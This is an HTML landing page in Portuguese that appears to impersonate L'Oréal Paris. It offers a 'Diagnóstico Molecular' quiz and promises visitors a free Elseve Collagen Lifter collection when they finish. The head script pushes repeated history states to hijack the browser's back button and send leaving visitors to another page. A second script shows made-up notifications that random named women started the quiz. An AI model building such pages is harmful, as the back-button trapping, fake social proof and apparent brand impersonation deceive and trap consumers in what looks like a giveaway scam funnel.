<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />

    <script>
      // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
      const link = 'back/1';

      function setBackRedirect(url) {
        let urlBackRedirect = url.trim();
        const currentParams = document.location.search;
        
        // Garante que os parâmetros sejam passados para o back redirect
        if (currentParams) {
            urlBackRedirect += (urlBackRedirect.includes('?') ? '&' : '?') + currentParams.replace('?', '');
        }

        history.pushState({}, '', location.href);
        history.pushState({}, '', location.href);
        history.pushState({}, '', location.href);

        window.addEventListener('popstate', () => {
          console.log('onpopstate', urlBackRedirect);
          setTimeout(() => {
            location.href = urlBackRedirect;
          }, 1);
        });
      }

      setBackRedirect(link);
    </script>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
    <title>L'Oréal Paris | The 2026 Experience</title>

    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Poppins:wght@200;400;600;800&display=swap" rel="stylesheet">

    <style>
        :root {
            --white: #FFFFFF;
            --purple-deep: #050208;
            --purple-glow: #2D0A4E;
            --accent: #B56BFF;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Poppins', sans-serif;
            background: var(--purple-deep);
            color: var(--white);
            min-height: 100vh;
            overflow-x: hidden;
            overflow-y: auto; 
            display: flex;
            flex-direction: column;
        }

        /* Fundo fixo para não quebrar no scroll */
        .universe {
            position: fixed; 
            inset: 0; 
            z-index: -1;
            background: 
                radial-gradient(circle at 50% -20%, var(--purple-glow) 0%, transparent 50%),
                radial-gradient(circle at 0% 100%, #1A082E 0%, transparent 40%);
        }

        .light-beam {
            position: fixed; /* Mudado para fixed para acompanhar a tela */
            top: 0; left: 50%;
            width: 1px; height: 100vh;
            background: linear-gradient(to bottom, transparent, rgba(255,255,255,0.1), transparent);
            transform: translateX(-50%);
            z-index: -1;
        }

        /* ========= CABEÇALHO ========= */
        header {
            padding: 40px 20px 20px;
            text-align: center;
            flex-shrink: 0;
        }

        .logo-loreal {
            font-family: 'Cinzel', serif;
            font-size: clamp(24px, 8vw, 34px); /* Tamanho adaptável */
            letter-spacing: 15px;
            font-weight: 400;
            text-shadow: 0 0 30px rgba(255,255,255,0.3);
            margin-right: -15px;
        }

        .quiz-tag-top {
            font-size: 10px;
            letter-spacing: 5px;
            text-transform: uppercase;
            color: var(--accent);
            font-weight: 600;
            margin-top: 5px;
            opacity: 0.8;
        }

        /* ========= CENA DOS PRODUTOS ========= */
        .product-stage {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            min-height: 350px; /* Garante espaço para os produtos */
            padding: 20px 0;
        }

        .product-aura {
            position: absolute;
            width: 300px; height: 300px;
            background: radial-gradient(circle, rgba(181, 107, 255, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            animation: pulseAura 4s infinite ease-in-out;
        }

        @keyframes pulseAura { 0%, 100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.2); } }

        .prod-float {
            position: absolute;
            filter: drop-shadow(0 25px 45px rgba(0,0,0,0.9));
            animation: floatHero 6s infinite ease-in-out;
            max-width: 30%; /* Responsividade das imagens */
        }

        .p-shampoo {
            width: 100px;
            left: 10%;
            top: 15%;
            animation-delay: 0s;
        }

        .p-cond {
            width: 95px;
            right: 10%;
            top: 10%;
            animation-delay: 1.5s;
        }

        .p-mask {
            width: 170px;
            z-index: 10;
            position: relative; /* Mantém no centro do flex */
            animation-delay: 0.8s;
        }

        @keyframes floatHero { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(3deg); } }

        /* ========= INTERFACE DO USUÁRIO ========= */
        .ui-panel {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            padding: 40px 30px 40px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 40px 40px 0 0;
            text-align: center;
            box-shadow: 0 -20px 50px rgba(0,0,0,0.5);
            flex-shrink: 0; /* Impede que o painel seja esmagado */
        }

        .info-pill {
            display: inline-block;
            padding: 6px 15px;
            background: rgba(181, 107, 255, 0.1);
            border: 1px solid rgba(181, 107, 255, 0.3);
            border-radius: 100px;
            font-size: 9px;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: var(--accent);
            margin-bottom: 20px;
        }

        h1 {
            font-size: 26px;
            font-weight: 200;
            letter-spacing: 1px;
            margin-bottom: 12px;
            text-transform: uppercase;
        }

        h1 b { font-weight: 800; color: var(--white); }

        .cta-crystal {
            width: 100%;
            padding: 22px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 18px;
            color: var(--white);
            font-weight: 700;
            font-size: 13px;
            letter-spacing: 4px;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.4s;
            position: relative;
            overflow: hidden;
            margin-top: 10px;
            display: block; /* Modificado para a tag a */
            text-align: center;
            text-decoration: none;
        }

        .cta-crystal:active { transform: scale(0.98); }

        .cta-crystal:hover {
            background: var(--white);
            color: #000;
            box-shadow: 0 0 30px rgba(255,255,255,0.3);
        }

        .cta-crystal::after {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: crystalShine 3s infinite;
        }

        @keyframes crystalShine { 0% { left: -100%; } 100% { left: 100%; } }

        .footer-minimal {
            margin-top: 25px;
            font-size: 9px;
            letter-spacing: 3px;
            opacity: 0.4;
            text-transform: uppercase;
        }

        /* Notificações */
        #notif-system { position: fixed; top: 30px; left: 20px; z-index: 10000; pointer-events: none; }
        .notif-bubble {
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(10px);
            padding: 10px 18px;
            border-radius: 100px;
            font-size: 10px;
            border: 1px solid rgba(255,255,255,0.1);
            animation: fadeIn 0.8s ease;
            margin-bottom: 10px;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }

    </style>
</head>
<body>

    <div class="universe"></div>
    <div class="light-beam"></div>
    <div id="notif-system"></div>

    <header>
        <div class="logo-loreal">L’ORÉAL</div>
        <div class="quiz-tag-top">Quiz 2026</div>
    </header>

    <main class="product-stage">
        <div class="product-aura"></div>
        
        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-shampoo-200ml-v2.png" 
             class="prod-float p-shampoo" alt="Shampoo">
        
        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-tratamento-300g-v2.png" 
             class="prod-float p-mask" alt="Tratamento">

        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-condicionador-200ml.png" 
             class="prod-float p-cond" alt="Condicionador">
    </main>

    <section class="ui-panel">
        <div class="info-pill">Duração estimada: 5 minutos</div>
        <h1>Diagnóstico <b>Molecular</b></h1>
        <p style="font-size: 14px; opacity: 0.7; margin-bottom: 30px; font-weight: 300; line-height: 1.6;">
            Identifique a arquitetura do seu fio e resgate sua coleção Elseve Collagen Lifter ao finalizar o protocolo.
        </p>

        <a href="index(1).html" class="cta-crystal" id="btn-iniciar">Iniciar Experiência</a>

        <div class="footer-minimal">
            © 2026 Recherche Avancée L’Oréal Paris
        </div>
    </section>

    <script>
        // Transição capturando o click e assegurando a passagem das UTMs
        document.getElementById('btn-iniciar').addEventListener('click', function(e) {
            e.preventDefault(); // Segura o click nativo
            
            let urlFinal = this.href; 
            const parametrosAtuais = window.location.search;

            // Se a URL do botão ainda não tem UTMs, nós copiamos da URL atual da página
            if (parametrosAtuais && !urlFinal.includes('utm_')) {
                urlFinal += (urlFinal.includes('?') ? '&' : '?') + parametrosAtuais.substring(1);
            }

            try {
                const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3');
                audio.play();
            } catch(e) { console.log("Audio play blocked"); }

            document.body.style.transition = "1s";
            document.body.style.opacity = "0";
            
            setTimeout(() => {
                // Redireciona usando a URL final garantindo os parâmetros
                window.location.href = urlFinal; 
            }, 800);
        });

        function showPop() {
            const system = document.getElementById('notif-system');
            const names = ["Sophie", "Valentina", "Isabelle", "Camille", "Beatriz", "Mariana"];
            const name = names[Math.floor(Math.random() * names.length)];
            
            const bubble = document.createElement('div');
            bubble.className = 'notif-bubble';
            bubble.innerHTML = `<b>${name}</b> iniciou o Quiz!`;
            
            system.appendChild(bubble);
            
            setTimeout(() => { 
                bubble.style.opacity = '0';
                setTimeout(() => bubble.remove(), 1000);
            }, 4000);
        }

        // Primeira notificação após 3 segundos
        setTimeout(showPop, 3000);
        // Repete a cada 10 segundos
        setInterval(showPop, 10000);
    </script>
</body>
</html>
